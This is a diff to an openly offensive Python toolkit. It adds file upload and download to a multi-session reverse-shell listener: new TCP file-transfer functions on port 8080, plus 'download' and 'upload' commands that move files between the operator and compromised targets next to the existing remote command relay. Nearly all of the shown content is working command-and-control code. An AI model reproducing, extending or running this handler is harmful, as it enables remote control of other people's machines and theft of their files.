@@ -26,6 +26,7 @@ import uuid
 import ctypes
 import dns.resolver
 import dns.rdatatype
+import tqdm
 try:
     import requests.packages.urllib3
     requests.packages.urllib3.disable_warnings()
@@ -65,6 +66,119 @@ Y8b Y88888P  dP,e,                    e88'Y88 ,8,"88e
                                                                                                               
 # Coded By Caleb McDaniels
 """)
+
+def send_file(conn, filename):
+    try:
+        # Device's IP address
+        SERVER_HOST = "0.0.0.0"
+        SERVER_PORT = 8080
+        # Receive 4096 bytes each time
+        SEPARATOR = "<SEPARATOR>"
+        BUFFER_SIZE = 4096
+        # Create the server socket
+        # TCP socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Set a timeout for socket operations
+        s.settimeout(10)  # connection should be instant so 10 seconds is fine
+        # Set the socket option to allow reusing the address
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # Bind the socket to our local address
+        s.bind((SERVER_HOST, SERVER_PORT))
+        # Enable our server to accept connections
+        # 5 here is the number of unaccepted connections that
+        # the system will allow before refusing new connections
+        s.listen(5)
+        # Accept connection if there is any
+        client_socket, address = s.accept()
+
+        # Check if the file exists
+        if not os.path.isfile(filename):
+            print("File not found")
+            return
+
+        # Get the file size
+        filesize = os.path.getsize(filename)
+        client_socket.send(str(filesize).encode())
+
+        # Start sending the file
+        print(f"[+] Sending {filename} with filesize {filesize} via TCP port {SERVER_PORT}")
+        with open(filename, "rb") as f:
+            while True:
+                # Read the bytes from the file
+                bytes_read = f.read(BUFFER_SIZE)
+                if not bytes_read:
+                    # File sending is done
+                    break
+                # Send the bytes to the server
+                client_socket.sendall(bytes_read)
+        print(f"[+] {filename} sent")
+        # Close the socket
+        client_socket.close()
+        # Close the server socket
+        s.close()
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+
+def receive_file(conn, filename):
+    try:
+        # Device's IP address
+        SERVER_HOST = "0.0.0.0"
+        SERVER_PORT = 8080
+        # Receive 4096 bytes each time
+        SEPARATOR = "<SEPARATOR>"
+        BUFFER_SIZE = 4096
+        # Create the server socket
+        # TCP socket
+        s = socket.socket()
+        # Set a timeout for socket operations
+        s.settimeout(10) #connection should be instant so 10 seconds is fine
+        # Set the socket option to allow reusing the address
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # Bind the socket to our local address
+        s.bind((SERVER_HOST, SERVER_PORT))
+        # Enable our server to accept connections
+        # 5 here is the number of unaccepted connections that
+        # the system will allow before refusing new connections
+        s.listen(5)
+        # Accept connection if there is any
+        client_socket, address = s.accept()
+
+        # Receive the file size
+        filesize_str = client_socket.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
+        try:
+            filesize = int(filesize_str)
+        except ValueError:
+            raise ValueError("Invalid filesize or file not found")
+
+        # Check if filesize is valid
+        if filesize <= 0:
+            raise ValueError("Invalid filesize or file not found")
+
+        # Start receiving the file from the socket
+        # and writing to the file stream
+        print(f"[+] Receiving {filename} with filesize {filesize} via TCP port {SERVER_PORT}")
+        with open(filename, "wb") as f:
+            while True:
+                # Read 1024 bytes from the socket (receive)
+                bytes_read = client_socket.recv(BUFFER_SIZE)
+                if not bytes_read:
+                    # Nothing is received
+                    # File transmitting is done
+                    break
+                # Write to the file the bytes we just received
+                f.write(bytes_read)
+
+        print(f"[+] {filename} received.")
+        # Close the client socket
+        client_socket.close()
+        # Close the server socket
+        s.close()
+    except socket.timeout:
+        print(f"Connection timed out. Port for file receiving is set to {SERVER_PORT}")
+    except ValueError as ve:
+        print(f"An error occurred: {ve}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 def fuzz():
     print("\n**USE BASH IF YOU WANT TO ENTER WHOLE FFUF COMMANDS**")
@@ -754,16 +868,16 @@ def is_valid_adapter(adapter_name):
     except subprocess.CalledProcessError:
         return False
 
-def handle_connection(conn, addr, session_num):
+def handle_connection(s, conn, addr, session_num):
     while True:
         if sessions[addr]['session_active']:
             # Wait for input from the target and the user
-            rlist, _, _ = select.select([conn, sys.stdin], [], [], 0.5)
+            rlist, wlist, xlist = select.select([conn, sys.stdin], [conn], [conn], 0.5)
             for r in rlist:
                 if r is conn:
                     # Receive data from the target and print it
                     try:
-                        data = conn.recv(1024).decode()
+                        data = conn.recv(4096).decode()
                     except:
                         continue
                     if not data:
@@ -775,11 +889,25 @@ def handle_connection(conn, addr, session_num):
                 elif r is sys.stdin:
                     # Get input from the user and send it to the target
                     command = input()
-                    if command == "background":
+                    if command.lower().startswith("background"):
                         # Keep the connection open so it can be returned to and go back to the main loop
                         sessions[addr]['session_active'] = False
                         print()
                         break
+                    elif command.lower().startswith("download"):
+                        conn.send(command.encode())
+                        parts = command.split(" ", 1)
+                        filename = parts[1].strip()
+                        # Call the receive_file function
+                        receive_file(conn, filename)
+                        
+                    elif command.lower().startswith("upload"):
+                        conn.send(command.encode())
+                        parts = command.split(" ", 1)
+                        filename = parts[1].strip()
+                        # Call the send_file function to initiate the upload
+                        send_file(conn, filename)
+                        
                     else:
                         command += "\n"
                         conn.send(command.encode())
@@ -810,10 +938,11 @@ def listen(ip, port):
                 print()
                 print("Connection accepted from:", addr, "establishing session", session_num)
 
-                t = threading.Thread(target=handle_connection, args=(conn, addr, session_num))
+                t = threading.Thread(target=handle_connection, args=(s, conn, addr, session_num))
                 t.start()
             else:
                 conn.close()  # Close the connection if IP address is not unique
+                
     except Exception as e:
         print()
         print(f"Error occurred: {e}")
